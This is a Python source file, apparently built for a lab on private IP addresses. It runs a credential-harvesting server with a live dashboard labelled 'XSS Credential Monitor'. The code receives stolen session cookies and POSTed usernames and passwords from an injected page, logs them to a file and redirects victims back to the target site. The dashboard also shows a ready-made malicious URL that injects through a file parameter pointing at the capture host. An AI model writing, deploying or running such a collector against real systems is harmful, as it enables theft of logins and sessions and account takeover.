from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import json, os, sys, threading

LOG_FILE = r"C:\Users\paulo.arruda\Desktop\econometria\credenciais_capturadas.txt"
CAPTURE_PORT = 8888
REDIRECT_URL = "http://172.30.1.12/index.php"

# Lista em memória para exibir no dashboard
capturas = []
lock = threading.Lock()

HTML_DASHBOARD = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>XSS Credential Monitor</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a0a2e, #2d1b4e);
            border-bottom: 1px solid rgba(255,0,80,0.3);
            padding: 24px 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 700;
            background: linear-gradient(90deg, #ff0050, #ff6b35);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header .status {
            display: flex; align-items: center; gap: 8px;
            font-size: 13px; color: #aaa;
        }
        .header .dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: #00ff88;
            box-shadow: 0 0 8px #00ff88;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        .stats {
            display: flex; gap: 20px; padding: 20px 40px;
            background: #0d0d14;
        }
        .stat-card {
            background: linear-gradient(135deg, #151520, #1a1a2e);
            border: 1px solid #2a2a3e;
            border-radius: 12px;
            padding: 20px 28px;
            flex: 1;
        }
        .stat-card .label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
        .stat-card .value { font-size: 32px; font-weight: 700; font-family: 'JetBrains Mono'; margin-top: 4px; }
        .stat-card .value.red { color: #ff0050; }
        .stat-card .value.orange { color: #ff6b35; }
        .stat-card .value.green { color: #00ff88; }
        .container { padding: 20px 40px; }
        .table-header {
            font-size: 14px; font-weight: 600; color: #ff6b35;
            margin-bottom: 12px;
            display: flex; align-items: center; gap: 8px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        thead th {
            background: #151520;
            color: #888;
            text-align: left;
            padding: 12px 16px;
            font-weight: 600;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 1px solid #2a2a3e;
        }
        tbody tr {
            border-bottom: 1px solid #1a1a2e;
            transition: background 0.2s;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        tbody tr:hover { background: rgba(255,0,80,0.05); }
        tbody td {
            padding: 14px 16px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
        }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge-login { background: rgba(255,0,80,0.15); color: #ff4080; }
        .badge-cookie { background: rgba(255,107,53,0.15); color: #ff6b35; }
        .cred-value {
            background: rgba(255,0,80,0.08);
            border: 1px solid rgba(255,0,80,0.2);
            padding: 4px 10px;
            border-radius: 6px;
            color: #ff8090;
        }
        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: #555;
        }
        .empty-state .icon { font-size: 48px; margin-bottom: 16px; }
        .empty-state p { font-size: 14px; max-width: 400px; margin: 0 auto; line-height: 1.6; }
        .url-box {
            background: #151520;
            border: 1px solid #2a2a3e;
            border-radius: 8px;
            padding: 16px 20px;
            margin: 20px 40px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: #ff6b35;
            word-break: break-all;
            cursor: pointer;
            transition: border-color 0.2s;
        }
        .url-box:hover { border-color: #ff6b35; }
        .url-box .label { color: #888; font-family: 'Inter'; font-size: 11px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>&#x1F6E1; XSS Credential Monitor</h1>
        <div class="status">
            <div class="dot"></div>
            <span id="statusText">Monitorando...</span>
        </div>
    </div>

    <div class="url-box" onclick="navigator.clipboard.writeText(this.querySelector('.url').textContent)">
        <div class="label">URL Maliciosa (clique para copiar)</div>
        <div class="url">http://172.30.1.12/index.php?file=http://172.25.176.1:8888/capture' x='</div>
    </div>

    <div class="stats">
        <div class="stat-card">
            <div class="label">Total Capturas</div>
            <div class="value red" id="totalCount">0</div>
        </div>
        <div class="stat-card">
            <div class="label">Credenciais</div>
            <div class="value orange" id="loginCount">0</div>
        </div>
        <div class="stat-card">
            <div class="label">Cookies</div>
            <div class="value green" id="cookieCount">0</div>
        </div>
    </div>

    <div class="container">
        <div class="table-header">&#x1F4CB; Capturas em Tempo Real</div>
        <table>
            <thead>
                <tr>
                    <th>Horário</th>
                    <th>Tipo</th>
                    <th>IP Origem</th>
                    <th>Usuário</th>
                    <th>Senha</th>
                    <th>Cookie</th>
                </tr>
            </thead>
            <tbody id="captureBody">
            </tbody>
        </table>
        <div class="empty-state" id="emptyState">
            <div class="icon">&#x1F50D;</div>
            <p>Nenhuma captura ainda. Abra a URL maliciosa acima em outra aba e faça login para testar.</p>
        </div>
    </div>

    <script>
        function fetchData() {
            fetch('/api/capturas')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('totalCount').textContent = data.length;
                    document.getElementById('loginCount').textContent = data.filter(d => d.type === 'LOGIN').length;
                    document.getElementById('cookieCount').textContent = data.filter(d => d.type === 'COOKIE').length;
                    document.getElementById('statusText').textContent = 'Atualizado ' + new Date().toLocaleTimeString('pt-BR');

                    const body = document.getElementById('captureBody');
                    const empty = document.getElementById('emptyState');

                    if (data.length === 0) {
                        empty.style.display = 'block';
                        body.innerHTML = '';
                        return;
                    }
                    empty.style.display = 'none';

                    body.innerHTML = data.slice().reverse().map(d => `
                        <tr>
                            <td>${d.timestamp}</td>
                            <td><span class="badge ${d.type === 'LOGIN' ? 'badge-login' : 'badge-cookie'}">${d.type}</span></td>
                            <td>${d.ip}</td>
                            <td>${d.usuario ? '<span class="cred-value">' + d.usuario + '</span>' : '-'}</td>
                            <td>${d.senha ? '<span class="cred-value">' + d.senha + '</span>' : '-'}</td>
                            <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${d.cookie || '-'}</td>
                        </tr>
                    `).join('');
                });
        }
        fetchData();
        setInterval(fetchData, 2000);
    </script>
</body>
</html>"""


class DashboardHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/" or self.path == "/dashboard":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_DASHBOARD.encode("utf-8"))

        elif self.path == "/api/capturas":
            with lock:
                data = json.dumps(capturas)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(data.encode("utf-8"))

        elif "c=" in self.path:
            # Captura cookie
            params = parse_qs(self.path.split("?", 1)[-1])
            cookie = params.get("c", [""])[0]
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = self.client_address[0]
            with lock:
                capturas.append({"timestamp": ts, "type": "COOKIE", "ip": ip, "usuario": None, "senha": None, "cookie": cookie})
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{ts}] COOKIE | IP: {ip} | Cookie: {cookie}\n")
            print(f"  [{ts}] COOKIE capturado de {ip}")
            sys.stdout.flush()
            self.send_response(302)
            self.send_header("Location", REDIRECT_URL)
            self.end_headers()

        else:
            self.send_response(302)
            self.send_header("Location", REDIRECT_URL)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        usuario = params.get("loginstring", [""])[0]
        senha = params.get("user_pw", [""])[0]
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = self.client_address[0]

        with lock:
            capturas.append({"timestamp": ts, "type": "LOGIN", "ip": ip, "usuario": usuario, "senha": senha, "cookie": None})

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] LOGIN  | IP: {ip} | Usuario: {usuario} | Senha: {senha}\n")

        print(f"  [{ts}] LOGIN capturado: {usuario} / {senha} de {ip}")
        sys.stdout.flush()

        self.send_response(302)
        self.send_header("Location", REDIRECT_URL)
        self.end_headers()

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    print()
    print("  =========================================")
    print("   DASHBOARD + CAPTURA XSS — PORTA 8888")
    print("  =========================================")
    print(f"  Dashboard: http://localhost:8888")
    print(f"  Aguardando capturas...")
    print()
    sys.stdout.flush()

    server = HTTPServer(("0.0.0.0", CAPTURE_PORT), DashboardHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
